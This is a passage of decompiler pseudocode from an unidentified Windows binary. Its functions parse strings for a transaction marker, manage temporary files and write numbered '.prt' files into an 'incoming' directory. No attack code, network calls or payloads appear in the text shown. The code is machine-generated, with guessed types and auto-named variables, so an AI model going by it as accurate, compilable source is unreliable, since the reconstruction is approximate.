            v26 = (LPCSTR)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
          qmemcpy((void *)(*(_DWORD *)(v10 + 4) + *(_DWORD *)(v10 + 8)), v26, v24);
          v27 = *(_DWORD *)(v10 + 4);
          v9 = a2;
          *(_DWORD *)(v10 + 8) = v25;
          *(_BYTE *)(v27 + v25) = 0;
        }
      }
      v28 = a5;
      v41 = -1;
      v29 = __CFADD__(v34, *a5);
      *a5 += v34;
      v28[1] += v35 + v29;
      if ( lpFirst )
      {
        v30 = *(lpFirst - 1);
        if ( v30 && v30 != -1 )
          *((_BYTE *)lpFirst - 1) = v30 - 1;
        else
          sub_40BC56((void *)(lpFirst - 1));
      }
      v31 = *(_DWORD *)(v9 + 8);
      lpFirst = 0;
      v38 = 0;
      v39 = 0;
      if ( !v31 )
        return 0;
      v8 = v42;
    }
  }
  return 0;
}
// 40D114: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(_DWORD, _DWORD, _DWORD, _DWORD);
// 40D124: using guessed type void __cdecl std::_Xlen();
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);
// 40D134: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(_DWORD, _DWORD, _DWORD);

//----- (00406B40) --------------------------------------------------------
int __cdecl sub_406B40(char *Str, int a2)
{
  int v2; // ebp
  unsigned int v3; // ebx
  int v4; // eax
  const CHAR *v5; // eax
  LPCSTR v6; // ecx
  char v7; // al
  _BYTE *v8; // eax
  unsigned int v9; // edi
  int v10; // ebx
  LPCSTR v11; // esi
  int v12; // eax
  int v13; // eax
  unsigned int v14; // ebx
  int v15; // ecx
  char v16; // al
  char v18; // [esp+13h] [ebp-21h]
  signed int v19; // [esp+14h] [ebp-20h]
  int v20; // [esp+18h] [ebp-1Ch]
  LPCSTR lpFirst; // [esp+1Ch] [ebp-18h]
  unsigned int v22; // [esp+20h] [ebp-14h]
  int v23; // [esp+30h] [ebp-4h]
  int v24; // [esp+3Ch] [ebp+8h]

  v18 = 0;
  LOBYTE(v20) = (_BYTE)Str;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v20, 0);
  v2 = a2;
  v3 = strlen((const char *)&unk_41104C);
  v23 = 0;
  v19 = 0;
  if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(a2, v3, 1) )
  {
    qmemcpy(*(void **)(a2 + 4), &unk_41104C, v3);
    v4 = *(_DWORD *)(a2 + 4);
    *(_DWORD *)(a2 + 8) = v3;
    *(_BYTE *)(v4 + v3) = 0;
  }
  v24 = 1;
  if ( !sub_401E90(Str, (int)&v20, 0) )
  {
    do
    {
      v5 = lpFirst;
      if ( !lpFirst )
        v5 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( StrStrIA(v5, a20Transaction_0) )
      {
        v19 = 1;
      }
      else if ( !v19 )
      {
        goto LABEL_27;
      }
      v6 = lpFirst;
      if ( lpFirst )
      {
        v7 = *(lpFirst - 1);
        if ( v7 && v7 != -1 )
        {
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(&v20, v22, 0);
          v6 = lpFirst;
        }
        if ( v6 )
        {
          *((_BYTE *)v6 - 1) = -1;
          v6 = lpFirst;
        }
        v8 = v6;
      }
      else
      {
        v8 = (_BYTE *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      }
      if ( *v8 == 46 )
      {
        v18 = 1;
        goto LABEL_31;
      }
      v9 = std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos;
      if ( v22 < std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos )
        v9 = v22;
      if ( std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos - *(_DWORD *)(v2 + 8) <= v9 )
        std::_Xlen();
      if ( v9 )
      {
        v10 = v9 + *(_DWORD *)(v2 + 8);
        if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                                v2,
                                v9 + *(_DWORD *)(v2 + 8),
                                0) )
        {
          v11 = lpFirst;
          if ( !lpFirst )
            v11 = (LPCSTR)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
          qmemcpy((void *)(*(_DWORD *)(v2 + 8) + *(_DWORD *)(v2 + 4)), v11, v9);
          v12 = *(_DWORD *)(v2 + 4);
          *(_DWORD *)(v2 + 8) = v10;
          *(_BYTE *)(v12 + v10) = 0;
        }
      }
LABEL_27:
      v13 = v24++;
    }
    while ( !sub_401E90(Str, (int)&v20, v13) );
  }
  v14 = strlen((const char *)&unk_41104C);
  if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(v2, v14, 1) )
  {
    qmemcpy(*(void **)(v2 + 4), &unk_41104C, v14);
    v15 = *(_DWORD *)(v2 + 4);
    *(_DWORD *)(v2 + 8) = v14;
    *(_BYTE *)(v15 + v14) = 0;
  }
  v6 = lpFirst;
LABEL_31:
  if ( v6 )
  {
    v16 = *(v6 - 1);
    if ( v16 && v16 != -1 )
      *((_BYTE *)v6 - 1) = v16 - 1;
    else
      sub_40BC56((void *)(v6 - 1));
  }
  return (v18 != 0) - 1;
}
// 40D124: using guessed type void __cdecl std::_Xlen();
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);
// 40D134: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(_DWORD, _DWORD, _DWORD);

//----- (00406D80) --------------------------------------------------------
signed int __cdecl sub_406D80(int a1, int a2, char a3, const char *a4)
{
  signed int v4; // esi
  signed int v5; // ST20_4
  char *v6; // ecx
  int v7; // eax
  char *v8; // edx
  void *v9; // ST24_4
  void **v10; // eax
  void *v11; // ST24_4
  void **v12; // eax
  void *v13; // ST24_4
  void **v14; // eax
  void *v16; // ST24_4
  void **v17; // eax
  void *v18; // ST24_4
  void **v19; // eax
  void *v20; // ST24_4
  void *v21; // edx
  void *v22; // ST24_4
  void **v23; // eax
  void *v24; // ST24_4
  void **v25; // eax
  void *v26; // ST24_4
  void **v27; // eax
  char *v28; // esi
  const CHAR *v29; // eax
  void *v30; // ST24_4
  void **v31; // eax
  void *v32; // ST24_4
  void **v33; // eax
  void *v34; // ST24_4
  void **v35; // eax
  unsigned int v36; // eax
  unsigned int v37; // esi
  char *v38; // ecx
  int v39; // eax
  unsigned __int64 v40; // kr18_8
  int v41; // ebp
  _BYTE *v42; // esi
  char *v43; // eax
  int v44; // esi
  char *v45; // eax
  LPCVOID v46; // eax
  void *v47; // ST24_4
  void **v48; // eax
  void *v49; // ST24_4
  void **v50; // eax
  void *v51; // ST24_4
  void *v52; // ST20_4
  char *v53; // eax
  char *v54; // eax
  char *v55; // ecx
  int v56; // eax
  int v57; // eax
  void *v58; // ST24_4
  void **v59; // eax
  void *v60; // ST24_4
  void **v61; // eax
  void *v62; // ST24_4
  void *v63; // ST20_4
  _DWORD *v64; // ebp
  _DWORD *v65; // eax
  int v66; // esi
  char *v67; // eax
  int v68; // edi
  int v69; // esi
  char *v70; // eax
  LPCVOID v71; // eax
  char *v72; // eax
  char *v73; // eax
  char *v74; // ecx
  int v75; // eax
  int v76; // edi
  _DWORD *v77; // eax
  int v78; // esi
  char *v79; // eax
  char *v80; // eax
  void *v81; // ST24_4
  void **v82; // eax
  void *v83; // ST24_4
  void **v84; // eax
  void *v85; // ST24_4
  void *v86; // edx
  void *v87; // ST24_4
  void **v88; // eax
  void *v89; // ST24_4
  void **v90; // eax
  void *v91; // ST24_4
  void *v92; // edx
  void *v93; // ST24_4
  void **v94; // eax
  void *v95; // ST24_4
  void **v96; // eax
  void *v97; // ST24_4
  void *v98; // edx
  int v99; // eax
  char v100; // [esp+13h] [ebp-3E5h]
  bool v101; // [esp+13h] [ebp-3E5h]
  int v102; // [esp+14h] [ebp-3E4h]
  int v103; // [esp+18h] [ebp-3E0h]
  char v104; // [esp+1Ch] [ebp-3DCh]
  void *Memory; // [esp+20h] [ebp-3D8h]
  unsigned int v106; // [esp+24h] [ebp-3D4h]
  int v107; // [esp+28h] [ebp-3D0h]
  void *v108; // [esp+2Ch] [ebp-3CCh]
  int v109; // [esp+30h] [ebp-3C8h]
  int v110; // [esp+34h] [ebp-3C4h]
  void *v111; // [esp+38h] [ebp-3C0h]
  int v112; // [esp+3Ch] [ebp-3BCh]
  int v113; // [esp+40h] [ebp-3B8h]
  LPCVOID lpBuffer; // [esp+44h] [ebp-3B4h]
  DWORD nNumberOfBytesToWrite; // [esp+48h] [ebp-3B0h]
  __int64 v116; // [esp+50h] [ebp-3A8h]
  int v117; // [esp+58h] [ebp-3A0h]
  char *v118; // [esp+5Ch] [ebp-39Ch]
  __int64 v119; // [esp+68h] [ebp-390h]
  __int64 v120; // [esp+70h] [ebp-388h]
  char v121; // [esp+78h] [ebp-380h]
  char *Str1; // [esp+7Ch] [ebp-37Ch]
  __int64 v123; // [esp+88h] [ebp-370h]
  int v124; // [esp+90h] [ebp-368h]
  char *Source; // [esp+94h] [ebp-364h]
  __int64 v126; // [esp+A0h] [ebp-358h]
  char v127; // [esp+B0h] [ebp-348h]
  LPCSTR lpFirst; // [esp+B4h] [ebp-344h]
  int v129; // [esp+C0h] [ebp-338h]
  char *v130; // [esp+C4h] [ebp-334h]
  bool v131; // [esp+D0h] [ebp-328h]
  int v132; // [esp+D4h] [ebp-324h]
  CHAR Buffer; // [esp+E0h] [ebp-318h]
  char v134; // [esp+E1h] [ebp-317h]
  __int16 v135; // [esp+1E1h] [ebp-217h]
  char v136; // [esp+1E3h] [ebp-215h]
  char Dest; // [esp+1E4h] [ebp-214h]
  char v138; // [esp+1E5h] [ebp-213h]
  __int16 v139; // [esp+2E5h] [ebp-113h]
  char v140; // [esp+2E7h] [ebp-111h]
  char Filename; // [esp+2E8h] [ebp-110h]
  char v142; // [esp+2E9h] [ebp-10Fh]
  __int16 v143; // [esp+3E9h] [ebp-Fh]
  char v144; // [esp+3EBh] [ebp-Dh]
  int v145; // [esp+3F4h] [ebp-4h]

  LOBYTE(v110) = v100;
  v111 = sub_40A2B0(0, 0);
  v112 = 0;
  LOBYTE(v107) = v100;
  v145 = 0;
  v108 = sub_40A2B0(0, 0);
  v109 = 0;
  LOBYTE(v145) = 1;
  v121 = v100;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v121, 0);
  LOBYTE(v145) = 2;
  v104 = v100;
  Memory = sub_40A2B0(0, 0);
  v106 = 0;
  LOBYTE(v145) = 3;
  v4 = 1;
  v119 = 0i64;
  v123 = 0i64;
  v116 = 0i64;
  while ( 1 )
  {
    Dest = 0;
    memset(&v138, 0, 0x100u);
    v139 = 0;
    v140 = 0;
    v5 = v4++;
    snprintf(&Dest, 0x103u, aSDDS, a1, a2, v5, a4);
    if ( access(&Dest, 0) )
      goto LABEL_9;
    LOBYTE(v113) = v100;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v113, 0);
    LOBYTE(v145) = 4;
    if ( sub_401E40(&Dest, (int)&v113) )
      break;
    sub_40A150(&v104, &v102, Memory, (char *)&v113);
    v6 = (char *)lpBuffer;
    if ( !lpBuffer )
      v6 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
    v7 = sub_4054F0(
           v6,
           (int)&v110,
           (int)&v107,
           v106 == 1 ? (unsigned int)&v121 : 0,
           v106 == 1 ? (unsigned int)&v119 : 0);
    LOBYTE(v145) = 3;
    if ( v7 )
    {
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v113, 1);
      goto LABEL_18;
    }
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v113, 1);
  }
  LOBYTE(v145) = 3;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v113, 1);
LABEL_9:
  if ( v4 < 0 || v106 <= 0 )
  {
LABEL_18:
    v16 = Memory;
    LOBYTE(v145) = 2;
    v17 = (void **)sub_40A140((_DWORD **)&v104, &v102);
    sub_40A220(&v104, (int)&v103, *v17, (int)v16);
    sub_40BC56(Memory);
    Memory = 0;
    v106 = 0;
    LOBYTE(v145) = 1;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v121, 1);
    v18 = v108;
    LOBYTE(v145) = 0;
    v19 = (void **)sub_40A140((_DWORD **)&v107, &v102);
    sub_40A220(&v107, (int)&v103, *v19, (int)v18);
    sub_40BC56(v108);
    v108 = 0;
    v20 = v111;
    v109 = 0;
    v145 = -1;
    v21 = (void *)*sub_40A140((_DWORD **)&v110, &v102);
    sub_40A220(&v110, (int)&v103, v21, (int)v20);
LABEL_19:
    sub_40BC56(v111);
    return -1;
  }
  v8 = Str1;
  LOBYTE(v102) = 0;
  if ( !Str1 )
    v8 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
  if ( !strnicmp(v8, Str, strlen(Str)) )
    LOBYTE(v102) = 1;
  if ( sub_405A30((int)&v110, (unsigned int *)&v123) )
  {
    v9 = Memory;
    LOBYTE(v145) = 2;
    v10 = (void **)sub_40A140((_DWORD **)&v104, &v102);
    sub_40A220(&v104, (int)&v103, *v10, (int)v9);
    sub_40BC56(Memory);
    Memory = 0;
    v106 = 0;
    LOBYTE(v145) = 1;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v121, 1);
    v11 = v108;
    LOBYTE(v145) = 0;
    v12 = (void **)sub_40A140((_DWORD **)&v107, &v102);
    sub_40A220(&v107, (int)&v103, *v12, (int)v11);
    sub_40BC56(v108);
    v108 = 0;
    v13 = v111;
    v109 = 0;
    v145 = -1;
    v14 = (void **)sub_40A140((_DWORD **)&v110, &v102);
    sub_40A220(&v110, (int)&v103, *v14, (int)v13);
    sub_40BC56(v111);
    return -1;
  }
  if ( sub_405A30((int)&v107, (unsigned int *)&v116) )
  {
    v22 = Memory;
    LOBYTE(v145) = 2;
    v23 = (void **)sub_40A140((_DWORD **)&v104, &v102);
    sub_40A220(&v104, (int)&v103, *v23, (int)v22);
    sub_40BC56(Memory);
    Memory = 0;
    v106 = 0;
    LOBYTE(v145) = 1;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v121, 1);
    v24 = v108;
    LOBYTE(v145) = 0;
    v25 = (void **)sub_40A140((_DWORD **)&v107, &v102);
    sub_40A220(&v107, (int)&v103, *v25, (int)v24);
    sub_40BC56(v108);
    v108 = 0;
    v26 = v111;
    v109 = 0;
    v145 = -1;
    v27 = (void **)sub_40A140((_DWORD **)&v110, &v102);
    sub_40A220(&v110, (int)&v103, *v27, (int)v26);
    sub_40BC56(v111);
    return -1;
  }
  v101 = v109 != 0;
  v28 = (char *)(*((_DWORD *)Memory + 1) + 8);
  v127 = *v28;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v127, 0);
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(
    &v127,
    v28,
    0,
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
  v29 = lpFirst;
  LOBYTE(v145) = 5;
  if ( !lpFirst )
    v29 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
  if ( !StrStrIA(v29, a62f) )
  {
    LOBYTE(v145) = 3;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v127, 1);
    v30 = Memory;
    LOBYTE(v145) = 2;
    v31 = (void **)sub_40A140((_DWORD **)&v104, &v102);
    sub_40A220(&v104, (int)&v103, *v31, (int)v30);
    sub_40BC56(Memory);
    Memory = 0;
    v106 = 0;
    LOBYTE(v145) = 1;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v121, 1);
    v32 = v108;
    LOBYTE(v145) = 0;
    v33 = (void **)sub_40A140((_DWORD **)&v107, &v102);
    sub_40A220(&v107, (int)&v103, *v33, (int)v32);
    sub_40BC56(v108);
    v108 = 0;
    v34 = v111;
    v109 = 0;
    v145 = -1;
    v35 = (void **)sub_40A140((_DWORD **)&v110, &v102);
    sub_40A220(&v110, (int)&v103, *v35, (int)v34);
    sub_40BC56(v111);
    return 1;
  }
  v36 = HIDWORD(v116);
  v37 = v116;
  if ( v116 && !a3 )
  {
    if ( Str1 )
    {
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Freeze(&v121);
      v38 = Str1;
      v36 = HIDWORD(v116);
      v37 = v116;
    }
    else
    {
      v38 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
    }
    sub_402E80(aCI64d, *v38, v37, v36);
    v36 = HIDWORD(v116);
    v37 = v116;
  }
  if ( (_BYTE)v102 )
  {
    if ( a3 )
    {
      dword_4195A8 = 1;
      dword_4195AC = 0;
      LODWORD(qword_4195B0) = v37;
      HIDWORD(qword_4195B0) = v36;
    }
    else
    {
      dword_4195B8 = 1;
      dword_4195BC = 0;
      LODWORD(qword_4195C0) = v37;
      HIDWORD(qword_4195C0) = v36;
    }
    v40 = v119 + v123 + __PAIR__(v36, v37);
    v39 = (v119 + v123 + __PAIR__(v36, v37)) >> 32;
    v117 = v40;
  }
  else
  {
    v39 = (unsigned __int64)(v119 + v123) >> 32;
    v117 = v119 + v123;
  }
  v118 = (char *)v39;
  Buffer = 0;
  memset(&v134, 0, 0x100u);
  v135 = 0;
  v136 = 0;
  GetTempPathA(0x103u, &Buffer);
  GetTempFileNameA(&Buffer, PrefixString, 0, &Buffer);
  v41 = v119;
  v126 = v119;
  v120 = 0i64;
  v103 = 1;
  if ( v112 )
  {
    v64 = *(_DWORD **)Memory;
    do
    {
      if ( v64 == Memory )
      {
        sub_401640(&Buffer);
        LOBYTE(v145) = 3;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v127, 1);
        v81 = Memory;
        LOBYTE(v145) = 2;
        v82 = (void **)sub_40A140((_DWORD **)&v104, &v102);
        sub_40A220(&v104, (int)&v103, *v82, (int)v81);
        sub_40BC56(Memory);
        Memory = 0;
        v106 = 0;
        LOBYTE(v145) = 1;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v121, 1);
        v83 = v108;
        LOBYTE(v145) = 0;
        v84 = (void **)sub_40A140((_DWORD **)&v107, &v102);
        sub_40A220(&v107, (int)&v103, *v84, (int)v83);
        sub_40BC56(v108);
        v108 = 0;
        v85 = v111;
        v109 = 0;
        v145 = -1;
        v86 = (void *)*sub_40A140((_DWORD **)&v110, &v102);
        sub_40A220(&v110, (int)&v103, v86, (int)v85);
        goto LABEL_19;
      }
      v65 = v64;
      v64 = (_DWORD *)*v64;
      v66 = (int)(v65 + 2);
      LOBYTE(v124) = *((_BYTE *)v65 + 8);
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v124, 0);
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(
        &v124,
        v66,
        0,
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
      LOBYTE(v113) = v101;
      LOBYTE(v145) = 10;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v113, 0);
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(
        &v113,
        &unk_41104C,
        strlen((const char *)&unk_41104C));
      v67 = Source;
      LOBYTE(v145) = 11;
      if ( !Source )
        v67 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      v68 = HIDWORD(v126);
      v69 = v126;
      if ( sub_405BE0((int)&v113, v103 == 1, v126, SHIDWORD(v126), v67)
        || sub_406810(
             (int)&v113,
             (int)&v110,
             v69,
             v68,
             (int *)&v120,
             (__int64 *)((_BYTE)v102 != 0 ? (unsigned int)&v116 : 0)) )
      {
        goto LABEL_115;
      }
      v70 = Source;
      if ( !Source )
        v70 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( sub_406050((int)&v113, v112 == 0, v120, SHIDWORD(v120), v117, (int)v118, v70) )
      {
LABEL_115:
        sub_401640(&Buffer);
        LOBYTE(v145) = 10;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v113, 1);
        LOBYTE(v145) = 5;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v124, 1);
        LOBYTE(v145) = 3;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v127, 1);
        v93 = Memory;
        LOBYTE(v145) = 2;
        v94 = (void **)sub_40A140((_DWORD **)&v104, &v102);
        sub_40A220(&v104, (int)&v103, *v94, (int)v93);
        sub_40BC56(Memory);
        Memory = 0;
        v106 = 0;
        LOBYTE(v145) = 1;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v121, 1);
        v95 = v108;
        LOBYTE(v145) = 0;
        v96 = (void **)sub_40A140((_DWORD **)&v107, &v102);
        sub_40A220(&v107, (int)&v103, *v96, (int)v95);
        sub_40BC56(v108);
        v108 = 0;
        v97 = v111;
        v109 = 0;
        v145 = -1;
        v98 = (void *)*sub_40A140((_DWORD **)&v110, &v102);
        sub_40A220(&v110, (int)&v103, v98, (int)v97);
        goto LABEL_19;
      }
      v71 = lpBuffer;
      if ( !lpBuffer )
        v71 = (LPCVOID)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( sub_401320(&Buffer, v71, nNumberOfBytesToWrite, 1) )
      {
        sub_401640(&Buffer);
        LOBYTE(v145) = 10;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v113, 1);
        LOBYTE(v145) = 5;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v124, 1);
        LOBYTE(v145) = 3;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v127, 1);
        v87 = Memory;
        LOBYTE(v145) = 2;
        v88 = (void **)sub_40A140((_DWORD **)&v104, &v102);
        sub_40A220(&v104, (int)&v103, *v88, (int)v87);
        sub_40BC56(Memory);
        Memory = 0;
        v106 = 0;
        LOBYTE(v145) = 1;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v121, 1);
        v89 = v108;
        LOBYTE(v145) = 0;
        v90 = (void **)sub_40A140((_DWORD **)&v107, &v102);
        sub_40A220(&v107, (int)&v103, *v90, (int)v89);
        sub_40BC56(v108);
        v108 = 0;
        v91 = v111;
        v109 = 0;
        v145 = -1;
        v92 = (void *)*sub_40A140((_DWORD **)&v110, &v102);
        sub_40A220(&v110, (int)&v103, v92, (int)v91);
        goto LABEL_19;
      }
      v131 = v101;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v131, 0);
      LOBYTE(v145) = 12;
      if ( !a3 && v101 )
      {
        v72 = (char *)lpBuffer;
        if ( !lpBuffer )
          v72 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        if ( !sub_404410(v72, (int)&v131) )
        {
          LOBYTE(v129) = v101;
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v129, 0);
          v73 = (char *)lpBuffer;
          LOBYTE(v145) = 13;
          if ( !lpBuffer )
            v73 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
          if ( !sub_406B40(v73, (int)&v129) )
          {
            v74 = v130;
            if ( !v130 )
              v74 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
            v75 = v132;
            if ( !v132 )
              v75 = `std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
            sub_402C90(v75, a2, v103, (int)&unk_419068, v74, v120, SHIDWORD(v120));
          }
          LOBYTE(v145) = 12;
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v129, 1);
        }
      }
      v76 = v103++ + 1;
      v126 = v120;
      LOBYTE(v145) = 11;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v131, 1);
      LOBYTE(v145) = 10;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v113, 1);
      LOBYTE(v145) = 5;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v124, 1);
    }
    while ( v112 );
    if ( a3 )
      goto LABEL_67;
    if ( v101 && v64 != Memory )
    {
      do
      {
        v77 = v64;
        v64 = (_DWORD *)*v64;
        v78 = (int)(v77 + 2);
        LOBYTE(v117) = *((_BYTE *)v77 + 8);
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v117, 0);
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(
          &v117,
          v78,
          0,
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
        LOBYTE(v145) = 14;
        LOBYTE(v129) = v101;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v129, 0);
        v79 = v118;
        LOBYTE(v145) = 15;
        if ( !v118 )
          v79 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        if ( !sub_404410(v79, (int)&v129) )
        {
          v80 = v130;
          if ( !v130 )
            v80 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
          sub_4027C0((int)&unk_419068, (int)v80, a2, v76);
        }
        LOBYTE(v145) = 14;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v129, 1);
        LOBYTE(v145) = 5;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v117, 1);
      }
      while ( v64 != Memory );
    }
LABEL_111:
    Filename = 0;
    memset(&v142, 0, 0x100u);
    v143 = 0;
    v144 = 0;
    Dest = 0;
    memset(&v138, 0, 0x100u);
    v139 = 0;
    v140 = 0;
    strcpy(&Dest, Path);
    strcat(&Dest, aIncoming);
    strcat(&Dest, a4);
    v99 = rand();
    sprintf(&Filename, a001604dPrt, v99 % 1000 + 8000);
    sub_4019F0(&Buffer, &Dest, &Filename, 1);
    sub_403EB0(&Dest, &Filename);
    goto LABEL_112;
  }
  v42 = (_BYTE *)(*sub_40A140((_DWORD **)&v104, &v102) + 8);
  LOBYTE(v117) = *v42;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v117, 0);
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(
    &v117,
    v42,
    0,
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
  LOBYTE(v145) = 6;
  LOBYTE(v113) = v101;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v113, 0);
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(
    &v113,
    &unk_41104C,
    strlen((const char *)&unk_41104C));
  v43 = v118;
  LOBYTE(v145) = 7;
  if ( !v118 )
    v43 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
  v44 = HIDWORD(v126);
  if ( sub_405BE0((int)&v113, 1, v41, SHIDWORD(v126), v43) )
    goto LABEL_116;
  v45 = v118;
  if ( !v118 )
    v45 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
  if ( sub_406050((int)&v113, 1, v41, v44, v41, v44, v45) )
  {
LABEL_116:
    sub_401640(&Buffer);
    LOBYTE(v145) = 6;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v113, 1);
    LOBYTE(v145) = 5;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v117, 1);
    LOBYTE(v145) = 3;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v127, 1);
    v58 = Memory;
    LOBYTE(v145) = 2;
    v59 = (void **)sub_40A140((_DWORD **)&v104, &v102);
    sub_40A220(&v104, (int)&v103, *v59, (int)v58);
    sub_40BC56(Memory);
    Memory = 0;
    v106 = 0;
    LOBYTE(v145) = 1;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v121, 1);
    v60 = v108;
    LOBYTE(v145) = 0;
    v61 = (void **)sub_40A140((_DWORD **)&v107, &v102);
    sub_40A220(&v107, (int)&v103, *v61, (int)v60);
    sub_40BC56(v108);
    v62 = v111;
    v108 = 0;
    v109 = 0;
    v145 = -1;
    v63 = (void *)*sub_40A140((_DWORD **)&v110, &v102);
    sub_40A220(&v110, (int)&v103, v63, (int)v62);
    goto LABEL_69;
  }
  v46 = lpBuffer;
  if ( !lpBuffer )
    v46 = (LPCVOID)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
  if ( sub_401320(&Buffer, v46, nNumberOfBytesToWrite, 1) )
  {
    sub_401640(&Buffer);
    LOBYTE(v145) = 6;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v113, 1);
    LOBYTE(v145) = 5;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v117, 1);
    LOBYTE(v145) = 3;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v127, 1);
    v47 = Memory;
    LOBYTE(v145) = 2;
    v48 = (void **)sub_40A140((_DWORD **)&v104, &v102);
    sub_40A220(&v104, (int)&v103, *v48, (int)v47);
    sub_40BC56(Memory);
